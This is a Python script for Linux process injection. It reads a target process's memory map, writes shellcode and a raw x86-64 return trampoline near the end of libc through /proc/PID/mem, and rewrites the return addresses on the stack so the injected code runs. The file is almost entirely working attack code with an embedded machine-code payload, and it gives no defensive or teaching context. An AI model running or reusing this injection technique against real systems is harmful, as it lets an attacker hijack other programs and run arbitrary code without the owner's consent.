#!/usr/bin/env python3

from time import sleep
from sys import argv
from os.path import exists, join, basename

from signal import SIGSTOP, SIGCONT
from os import kill as sig
from os import fdopen
from struct import pack

from src.shellcode import shellcode

pointer_size = 8   # 4
pchar = 'Q'        # I
delay = 10

def maps_parsing(data_maps):
    lst_maps = []
    lines = data_maps.split("\n")
    for i in range(len(lines) - 1):
        values = lines[i].split()
        dct = {}
        start, finish = values[0].split("-")
        dct["addr_start"] = int(start, 16)
        dct["addr_finish"] = int(finish, 16)
        dct["size"] = int(finish, 16) - int(start, 16)
        dct["str_addr_start"] = start
        dct["str_addr_finish"] = finish
        dct["perms"] = values[1]
        dct["offset"] = values[2]
        dct["dev"] = values[3]
        dct["inode"] = values[4]
        if len(values) == 6:
            dct["pathname"] = values[5]
        lst_maps.append(dct)
    return lst_maps

def get_pathnames(lst_maps):
    pathnames = {}
    for i in range(len(lst_maps)):
        if "pathname" in lst_maps[i] and "perms" in lst_maps[i]:
            pathname = basename(lst_maps[i]["pathname"])
            perms = lst_maps[i]["perms"]
            if "x" in perms or pathname == "[stack]":
                pathnames[pathname] = lst_maps[i]
    return pathnames

def lst_to_bytes(lst):
    return b"".join(map(lambda x: bytes([x]), lst))

def find_addrs_in_mem(data, pathnames, offset, checkflag=True):
    ret_dct = {}
    acc = 0

    if checkflag:
        if data[:2*pointer_size] != 2*pointer_size*b"\x00":
            value = 0
            shift = pointer_size
            for i in range(pointer_size):
                value += (2**pointer_size)**i * data[i+shift]
            bytesize = (value + 1) * 2*pointer_size
            print("[!] Stack may have been infected in the past (count is {:d}, size={:d})".format(value, bytesize))
            data = bytesize*b"\x00" + data[bytesize:]

    for key, dct in pathnames.items():
        lst = []
        for i in range(len(data) - pointer_size + 1):
            value = 0
            for j in range(pointer_size):
                value += (2**pointer_size)**j * data[i+j]
            if dct["addr_start"] < value < dct["addr_finish"]:
                lst.append([i+offset, value])
                acc += 1
        ret_dct[key] = lst
    return ret_dct

def code_execute(pid, pathnames, retcode, nextcode, flag_norestore):
    path_mem = "/proc/{:d}/mem".format(pid)
    stack = pathnames["[stack]"]
    libc = None
    del pathnames["[stack]"]
    for key, values in pathnames.items():
        if "libc" in key:
            libc = values
            break
    if libc == None:
        print("[!] Libc Error")
        return -1

    payload_size = len(nextcode) + len(retcode) + pointer_size
    nextcode_addr = libc["addr_finish"] - payload_size
    stack_base = stack["addr_start"]

    with open(path_mem, 'rb') as m:
        m.seek(nextcode_addr)
        backup = m.read(payload_size)
        m.seek(stack_base)
        data = m.read(stack["size"])

    ret_dct = find_addrs_in_mem(data, pathnames, stack_base)
    retcode_addr = nextcode_addr + len(nextcode)
    stack_retstruct = b""
    acc = 0

    for key, values in sorted(ret_dct.items()):
        print("[~] {}: {:d} found".format(key, len(values)))
        acc += len(values)
        for pair in values:
            print("    0x{:x} -> 0x{:x}".format(pair[0], pair[1]))
            stack_retstruct += pack(pchar, pair[0])
            stack_retstruct += pack(pchar, pair[1])
    print("[*] total is {:d}".format(acc))

    stack_retstruct  = pack(pchar, nextcode_addr) + pack(pchar, acc) + stack_retstruct

    with open(path_mem, 'wb') as m:
        m.seek(nextcode_addr)
        m.write(nextcode + retcode + pack(pchar, stack_base))
        print("[*] nextcode addr is 0x{:x}, retcode addr is 0x{:x}".format(nextcode_addr, retcode_addr))
        m.seek(stack_base)
        m.write(stack_retstruct)

        for values in sorted(ret_dct.values()):
            for pair in values:
                m.seek(pair[0])
                # real ret to spoofed ret addr
                retcode_addr_bytes = pack(pchar, retcode_addr)
                m.write(retcode_addr_bytes)

    if flag_norestore == False:
        sleep(delay)
        with open(path_mem, 'wb') as m:
            # backup libc
            m.seek(nextcode_addr)
            m.write(backup)
            # backup stack
            #zeros = b"\x00" * len(stack_retstruct)
            #m.seek(stack_base)
            #m.write(zeros)
    


def main(pid, shellcode, flag_norestore=False):
    print("current pid is {:d}\n".format(pid))
    path_maps = "/proc/{:d}/maps".format(pid)
    if not exists(path_maps):
        print("[!] proc doesn't exist")
        return -1
    with open(path_maps, "r") as f:
        data_maps = f.read()
    lst_maps = maps_parsing(data_maps)
    pathnames = get_pathnames(lst_maps)

    retcode = [0xeb, 0x68, 0x50, 0x50, 0x53, 0x51, 0x52, 0x56, 0x57, 0x48, 0x8b, 0x44, 0x24, 0x38, 0x48, 0x8b, 0x0, 0x48, 0x31, 0xc9, 0x48, 0x8b, 0x18, 0x48, 0x89, 0x8, 0x48, 0x89, 0xe6, 0x48, 0x83, 0xc6, 0x38, 0x48, 0x8b, 0x48, 0x8, 0x48, 0x83, 0xc0, 0x10, 0xeb, 0x8, 0x48, 0x89, 0x16, 0x48, 0x85, 0xdb, 0x74, 0x23, 0x48, 0xff, 0xc9, 0x48, 0x8b, 0x38, 0x48, 0x83, 0xc0, 0x8, 0x48, 0x8b, 0x10, 0x48, 0x83, 0xc0, 0x8, 0x48, 0x85, 0xdb, 0x74, 0x3, 0x48, 0x89, 0x17, 0x48, 0x31, 0xf7, 0x74, 0xda, 0x48, 0x85, 0xc9, 0x75, 0xdd, 0x48, 0x89, 0x5e, 0xf8, 0x48, 0x85, 0xdb, 0x5f, 0x5e, 0x5a, 0x59, 0x5b, 0x58, 0x75, 0x4, 0x48, 0x83, 0xc4, 0x8, 0xc3, 0xe8, 0x93, 0xff, 0xff, 0xff]

    retcode = lst_to_bytes(retcode)
    shellcode = lst_to_bytes(shellcode)

    code_execute(pid, pathnames, retcode, shellcode, flag_norestore)



if __name__ == "__main__":
    if len(argv) >= 2:
        pid = int(argv[1])
        flag = True
        if len(argv) >= 3:
            flag = int(argv[2])
        main(pid, shellcode, flag_norestore=flag)
    else:
        print("usage: ./mem_read.py 1337")
